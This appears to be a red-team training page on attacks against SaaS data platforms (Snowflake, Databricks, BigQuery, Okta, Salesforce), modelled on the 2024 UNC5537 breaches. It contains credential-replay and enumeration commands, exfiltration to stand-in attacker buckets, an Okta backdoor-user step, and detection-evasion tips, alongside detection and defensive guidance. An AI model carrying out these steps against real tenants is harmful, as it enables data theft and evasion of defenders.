---
layout: training-page
title: "SaaS Data Plane Attacks — Snowflake, Databricks, BigQuery, Okta — Red Team Academy"
module: "Red Team Tools"
tags:
  - saas
  - snowflake
  - databricks
  - bigquery
  - okta
  - token-theft
  - data-plane
  - infostealer
  - unc5537
  - cloud
page_key: "cloud-saas-data-plane-attacks"
render_with_liquid: false
---

# SaaS Data Plane Attacks

The dominant breach class of 2024 was not a kernel exploit or a phishing-to-DA chain. It was credential reuse against SaaS data warehouses, BI platforms, and identity providers — surfaces with no EDR, no host-based detection, weak conditional access, and stored data orders of magnitude more valuable than what lives on the average endpoint. UNC5537 / Scattered Spider's attacks on Snowflake customer tenants (Ticketmaster, AT&T, Santander, LendingTree, Advance Auto Parts, Neiman Marcus, and others — ~165 victims by the August 2024 Mandiant disclosure) crystallized the pattern. The corporate AD-and-endpoint side of the house was untouched. The breach happened entirely in the data plane.

This page covers the attack class: how operators discover SaaS data plane targets, how credentials are obtained without ever touching a corporate endpoint, the specific tradecraft against Snowflake / Databricks / BigQuery / Okta / Salesforce, and the detection surface — because operators who do not understand it will burn an entire engagement chasing on-prem when the data was never on-prem.

## Why the Data Plane Is the New Target

The shift is structural. Three changes between 2018 and 2024 made the SaaS data plane the highest-EV attack surface in most enterprises.

1. **Data gravity migrated.** What used to live in on-prem Oracle and SQL Server now lives in Snowflake, BigQuery, Databricks, Redshift, and Synapse. Customer data, financials, M&A pipelines, source code, and analytics models all moved up the stack.
2. **Endpoint security got hard.** Falcon, MDE, SentinelOne, Carbon Black, and friends made the endpoint expensive to attack. Operators went where the defenders weren't.
3. **SaaS identity collapsed to passwords.** Many SaaS platforms still allow username/password without MFA, or allow service accounts to authenticate with long-lived static credentials. The platforms shipped multi-tenant; tenants did not all turn on the optional hardening.

A SaaS data plane attack also has lower legal friction for the attacker — there is no malware to drop, no shell to land, no kernel callbacks to evade. It is a query language with valid credentials.

## The Threat Model

```
+-----------------------------+        +-------------------------------+
|  Stage 1: credential source |        |  Stage 2: SaaS data plane     |
|  (no EDR, low detection)    |---->   |  (no EDR, weak audit, query)  |
+-----------------------------+        +-------------------------------+

Credential sources                     Data plane targets
- Infostealer logs                     - Snowflake
- Public repo .env leaks               - Databricks
- CI/CD variable dumps                 - BigQuery / Redshift / Synapse
- Lapsus-style helpdesk vishing        - Okta / Auth0 (identity plane)
- Old breach corpora (combolists)      - Salesforce / Workday / ServiceNow
- Browser credential stores            - Atlassian Cloud
- MFA-fatigue success                  - Slack / Teams / Notion
- AitM phishing
```

The two stages are decoupled. Operators do not need to phish a target user. The credential corpus is harvested at scale (infostealer markets, breach data, password reuse) and tested against SaaS tenants by automation. The first valid hit wins.

## Snowflake — The UNC5537 Pattern

The Snowflake attacks of 2024 were not a Snowflake vulnerability. They were a stack of choices that Snowflake customers made — choices Snowflake's defaults allowed.

### How the attacks worked

1. **Credential source.** Mandiant traced ~165 victim accounts to passwords stolen by Vidar, Lumma C2, RisePro, and Raccoon Stealer infostealers — many of them from non-corporate contractor machines that happened to have a Snowflake login saved in a browser. The credentials in question were sometimes 2 to 4 years old; Snowflake did not enforce rotation.
2. **No MFA.** Snowflake tenants prior to mid-2024 did not enforce MFA by default. Many customer accounts were single-factor.
3. **No network allow-listing.** Snowflake supports network policies that restrict logins to specific IP ranges. Most victim accounts did not have one set.
4. **Static service accounts.** Several victims authenticated via long-lived service-account credentials with broad warehouse access.

Operators built tooling — `rapeflake.py` was named publicly — that took a credential corpus, attempted authentication against Snowflake account URLs (`<orgname>-<account>.snowflakecomputing.com`), enumerated databases, and dumped tables by issuing standard SQL.

### Tradecraft

```
# Account URL enumeration — every Snowflake tenant has a known URL shape
# Pattern: https://<orgname>-<account>.snowflakecomputing.com
# Account name is often org-prefixed; org name is sometimes the company brand

# Enumerate via subdomain wordlist or via leaked URLs in:
# - Public Snowflake community posts
# - Customer docs (e.g., "Connect to mycompany.snowflakecomputing.com")
# - GitHub repos referencing connection strings

# Authentication via snowsql CLI
snowsql -a mycompany-prod -u service_user -d MYCOMPANY_DB -w COMPUTE_WH

# Programmatic via Python connector
python3 - <<'EOF'
import snowflake.connector
c = snowflake.connector.connect(
    user='service_user',
    password='LeakedPasswordFromInfostealer',
    account='mycompany-prod',
)
cs = c.cursor()
cs.execute("SHOW DATABASES")
for row in cs:
    print(row)
EOF
```

### Once inside

Standard discovery is just SQL.

```sql
-- Enumerate databases and schemas
SHOW DATABASES;
SHOW SCHEMAS IN DATABASE PROD;
SHOW TABLES IN SCHEMA PROD.PUBLIC;

-- Find high-signal tables by name
SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, ROW_COUNT
FROM SNOWFLAKE.ACCOUNT_USAGE.TABLES
WHERE TABLE_NAME ILIKE '%CUSTOMER%'
   OR TABLE_NAME ILIKE '%PII%'
   OR TABLE_NAME ILIKE '%CARD%'
   OR TABLE_NAME ILIKE '%SSN%'
   OR TABLE_NAME ILIKE '%PAYROLL%'
ORDER BY ROW_COUNT DESC;

-- Recent table activity tells you what is "live"
SELECT TABLE_NAME, LAST_ALTERED, ROW_COUNT
FROM SNOWFLAKE.ACCOUNT_USAGE.TABLES
ORDER BY LAST_ALTERED DESC
LIMIT 50;

-- Look at queries other users ran — query history reveals data shape
SELECT USER_NAME, QUERY_TEXT, START_TIME
FROM SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY
WHERE START_TIME > DATEADD(day, -7, CURRENT_TIMESTAMP())
ORDER BY START_TIME DESC
LIMIT 100;
```

### Exfiltration

```
-- COPY INTO a stage, then download
-- This is a normal Snowflake operation — the data engineering team does it every day

-- Stage creation (S3 or Azure)
CREATE STAGE attacker_stage URL='s3://operator-bucket/exfil/'
  CREDENTIALS = (AWS_KEY_ID='AKIA...' AWS_SECRET_KEY='...');

-- Or use an existing internal stage and pull via snowsql GET
COPY INTO @attacker_stage/customers.csv
FROM PROD.PUBLIC.CUSTOMERS
FILE_FORMAT = (TYPE = CSV);

-- Locally
snowsql -a mycompany-prod -u service_user -q "
GET @attacker_stage/customers.csv file:///tmp/
"
```

The transaction looks identical to a routine ETL job. There is no host telemetry to alert on because the operator never touched a host the target controls.

## Databricks

Databricks shares the SaaS data warehouse profile and shares the attack surface. The differences are mostly operational.

```
# Personal Access Tokens (PATs) — bearer tokens, long-lived by default
# Pattern: dapi<hex>
# Often committed to .gitignore'd-but-pushed files or .env files

# Workspace API enumeration
databricks workspaces list --token <pat>
databricks clusters list --token <pat>
databricks jobs list --token <pat>
databricks secrets list-scopes --token <pat>

# Cluster init scripts as code execution path
# - Init scripts run on cluster boot as root
# - Attacker with workspace edit can attach malicious init script
# - Lives in DBFS or workspace files

# Notebook execution via API for queryless ops
curl -X POST https://<workspace>.cloud.databricks.com/api/2.1/jobs/runs/submit \
  -H "Authorization: Bearer <pat>" \
  -d '{"run_name":"exfil","notebook_task":{"notebook_path":"/Shared/legitlooking"}}'
```

The high-value find on a Databricks tenant is usually the **secret scope** — Databricks-managed credential storage that frequently contains AWS keys, JDBC credentials, S3 access tokens, and Snowflake credentials. Pivoting from Databricks to S3 / Snowflake / Redshift via leaked-scope credentials is a normal flow.

## BigQuery / Redshift / Synapse

BigQuery's data plane is reached primarily via Google Cloud SDK with service-account keys or user OAuth tokens. The attack pattern mirrors Snowflake — credential source plus query language.

```
# Service-account key as initial credential
gcloud auth activate-service-account --key-file=stolen-sa.json

# Project enumeration
gcloud projects list
gcloud config set project target-prod

# BigQuery enumeration via bq CLI
bq ls
bq ls target-prod:analytics
bq show target-prod:analytics.customers

# Query with destination table for staging
bq query --use_legacy_sql=false --destination_table=target-prod:tmp.exfil_stage \
  "SELECT * FROM analytics.customers"

# Export to Cloud Storage
bq extract target-prod:tmp.exfil_stage gs://attacker-bucket/exfil-*.csv
```

Redshift uses standard PostgreSQL wire protocol with IAM-or-password auth. Synapse follows the SQL Server SQL-auth pattern. Once an operator has the credential, the data plane is just SQL.

## Okta — The Identity Plane as Target

Okta sits one layer up — it is not where the data lives, but it is what gates access to every other SaaS tenant the customer has integrated. Compromising an Okta tenant is the universal SaaS skeleton key.

### Patterns publicly documented in 2022-2024

- **MFA push fatigue** plus **Okta verify enrollment hijack** — the Uber 2022 / Lapsus pattern. The operator owns the user's password, spams MFA push requests until the user approves, then enrolls their own device.
- **Super-admin support-vendor breach** — the Okta customer-support compromise of Sept-Oct 2023 leaked HAR files containing session tokens, which were used against high-profile customer tenants.
- **Stolen administrator session tokens** — anytime an Okta admin has an active session, the bearer token in their browser storage can be replayed.

### Tradecraft once you have an Okta admin session

```
# Enumerate users
curl -H "Authorization: SSWS <admin-api-token>" \
  https://target.okta.com/api/v1/users

# Enumerate applications and SAML assignments
curl -H "Authorization: SSWS <admin-api-token>" \
  https://target.okta.com/api/v1/apps

# Look at sign-on policies (find the apps with weak/no MFA)
curl -H "Authorization: SSWS <admin-api-token>" \
  https://target.okta.com/api/v1/policies?type=ACCESS_POLICY

# Impersonate any user via Okta admin "Impersonate" feature
# - Opens an authenticated session as the target user
# - Federates into every SAML-enabled app

# Or create a new "service" user with broad app assignments and use it directly
curl -X POST -H "Authorization: SSWS <admin-api-token>" \
  https://target.okta.com/api/v1/users \
  -d '{...minimal user payload with all-app group assignment...}'
```

The yield is every downstream SaaS the tenant integrates: Salesforce, Workday, ServiceNow, Atlassian, GitHub Enterprise, AWS via IDP federation. Okta is a force multiplier.

## Salesforce, Workday, ServiceNow

These three deserve mention because they are universally underestimated in red team scope and they hold extraordinarily high-value data.

- **Salesforce**: Connected Apps with OAuth — refresh tokens that survive password changes. Apex code execution if admin profile. Reports as a discovery mechanism. Bulk API for data export.
- **Workday**: REST API + SOAP API. HR records, compensation, org charts, manager hierarchies, banking detail for direct deposit. Workday SOAP allows bulk export with normal user permissions.
- **ServiceNow**: REST API to `now/table/` endpoints. CMDB contains an entire inventory of the customer's IT estate. Knowledge base often contains password reset procedures, internal credentials, vendor contracts.

```
# ServiceNow CMDB pull — every host, every IP, every owner
curl -u "stolen:creds" "https://target.service-now.com/api/now/table/cmdb_ci_computer?sysparm_limit=10000" \
  -o cmdb.json

# Salesforce Bulk API job
curl -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -X POST https://target.my.salesforce.com/services/data/v59.0/jobs/query \
  -d '{"operation":"queryAll","query":"SELECT Id,Name,Email,Phone FROM Contact"}'
```

## Credential Sources — Where the Initial Access Comes From

The unique thing about SaaS data plane attacks is that the credential source is decoupled from the target. Operators do not phish the target organization. They harvest credentials at scale and check them against tenants.

| Source | What it is | Why it works |
|---|---|---|
| **Infostealer logs** | Vidar, Lumma, RedLine, RisePro, Raccoon — sold on Russian Market, Genesis (defunct), Telegram channels | Stealers exfil browser-saved logins; corporate SaaS logins land in personal-device browsers via BYOD |
| **Combolists** | Username:password sets aggregated from public breaches | SaaS auth often lacks MFA + password reuse is universal |
| **GitHub / public repo leaks** | `.env`, `credentials.json`, `azure-pipelines.yml` | Service account keys committed by accident |
| **CI/CD variable dumps** | Misconfigured GitHub Actions logs, GitLab job logs | Long-lived secrets printed by debug commands |
| **HAR file exfil** | Browser session captures from support tickets | Vendor / contractor session tokens leaked to attacker |
| **MFA fatigue** | Spam push prompts to user phone | One accidental tap = valid session |
| **Helpdesk vishing** | Lapsus / Scattered Spider pattern | Reset target's MFA via call to IT helpdesk |
| **AitM phishing** | EvilGoPhish / Evilginx targeting SaaS login pages | Captures session token, bypasses MFA |

For an engagement, the realistic question is which of these channels are in scope for the red team. Customer-side infostealer-log purchases generally are not, but mimicking the attack with a contractor account that the customer-side team plants is a common scope agreement.

## Operational Discipline — Living Inside the Data Plane

The blue side of these attacks is weak, but it is not zero. Operators with poor discipline still get caught.

- **Region matters.** A login from Latvia to a US-only company will fire even basic anomaly detection. Use a residential proxy in-region.
- **User-agent fingerprint.** The Python connector has a default UA; production traffic doesn't. Mimic the BI tool the target uses (Tableau, Looker, Sigma).
- **Query shape.** `SELECT *` against a 10 GB table at 2 a.m. has a Snowflake credit cost that lights up cost-anomaly alerts. Page through.
- **Warehouse size.** Spinning up an X-LARGE warehouse to exfil fast is noisier than throttling on SMALL.
- **Time of day.** Run during the target's working hours.
- **Bursting.** Slow drip over hours beats a single 10-minute bulk export.
- **Audit log shape.** The QUERY_HISTORY view in Snowflake records every statement. Avoid statements that telegraph intent (`SELECT CARD_NUMBER, CVV FROM CUSTOMERS`).

## Detection — What the Defender Should See (And Often Doesn't)

Operators benefit from knowing the blue surface. The same view tells you when to stop.

- **Snowflake**: ACCOUNT_USAGE.LOGIN_HISTORY (IP, client, success), QUERY_HISTORY (statement text, warehouse, cost), ACCOUNT_USAGE.ACCESS_HISTORY (column-level access).
- **Databricks**: workspace audit logs (job creation, secret access, token issuance).
- **Okta**: System Log — every API call. `policy.evaluate_sign_on` for adaptive auth decisions. Tenant-level rate of impersonation events.
- **Salesforce**: Event Monitoring (paid SKU, often not enabled) gives bulk-api-result events; without it, the audit trail is thin.
- **BigQuery**: Cloud Audit Logs — Admin Activity (free), Data Access (paid and often disabled).

The recurring theme: the high-fidelity logs exist, they are paid SKUs, and many tenants do not enable them. The first ten queries an operator runs against a fresh SaaS tenant are almost always invisible because the customer has not turned on the relevant log stream.

## Tools

Public, defensively useful, and well-known in the bug-bounty / pentest community.

- **`pacu`** — AWS exploitation framework (covered at `/cloud/aws-attacks`), useful for IAM pivot from leaked SaaS-stage credentials.
- **`SnowHoover`** — community tool for Snowflake enumeration given a credential.
- **`okta-admin`** — Python library for scripted Okta enumeration with an API token.
- **`o365recon`** / **`AADInternals`** — Entra / M365 surface enumeration, applicable when the SaaS target federates with Microsoft.
- **`SharpHound`** — for the AD side once a SaaS pivot lands you back on-prem via federation.
- **`TruffleHog`** / **`gitleaks`** — secret scanning of public repos, the standard first stage for credential harvest in the discovery phase.

## Defensive Lessons — What the Engagement Should Recommend

Engagements that surface a SaaS data plane gap should put these in the report regardless of whether the customer pushed back during scoping:

1. **Mandatory MFA on every SaaS auth path** including service accounts (use OAuth + short-lived tokens, not static creds).
2. **Network policies / IP allow-lists** on the SaaS tenant for service-account auth.
3. **Credential rotation policy** that actually rotates — Mandiant's UNC5537 corpus showed credentials 2-4 years stale.
4. **Audit log enablement** at the data plane level (Snowflake ACCOUNT_USAGE, Salesforce Event Monitoring, Workday audit reports).
5. **Tenant-side detection rules**: cost anomaly alerts, login-from-new-region, bulk-export volumetric alerts.
6. **Contractor / BYOD posture**: if a contractor laptop is allowed to save a SaaS login in Chrome, your SaaS tenant is one infostealer away from a breach.
7. **Periodic dark-web credential checking** against the tenant's known user list.

## Resources

- Mandiant, "UNC5537 Targets Snowflake Customer Instances for Data Theft and Extortion" (June 2024)
- CISA Cybersecurity Advisory AA24-XXX on Snowflake threat activity
- Okta, "October 2023 Security Incident" customer notification
- Snowflake, "Detecting and Preventing Unauthorized User Access" guidance
- Brian Krebs, KrebsOnSecurity coverage of the Snowflake breach wave (2024)
- Microsoft Threat Intelligence, "Storm-0539" and "Octo Tempest" profiles
- Permiso Security, Snowflake-specific detection rule library
- SpecterOps, "BloodHound for SaaS" research
